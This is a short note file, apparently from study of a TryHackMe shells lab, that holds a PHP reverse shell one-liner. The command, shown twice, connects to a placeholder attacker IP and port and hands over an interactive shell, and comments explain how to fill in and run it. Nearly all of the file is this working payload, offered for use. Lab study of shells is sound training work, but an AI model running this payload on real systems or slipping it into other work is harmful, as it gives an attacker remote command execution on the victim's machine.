# PHP Reverse Shell - system()
# Source: TryHackMe - Shells Overview, Task 6
# Usage: replace ATTACKER_IP and PORT, run with: php -r '<command>'
#
#   php -r '$sock=fsockopen("ATTACKER_IP",PORT);system("sh <&3 >&3 2>&3");'
#
# Uses system() which executes the command and outputs the result.

php -r '$sock=fsockopen("ATTACKER_IP",PORT);system("sh <&3 >&3 2>&3");'
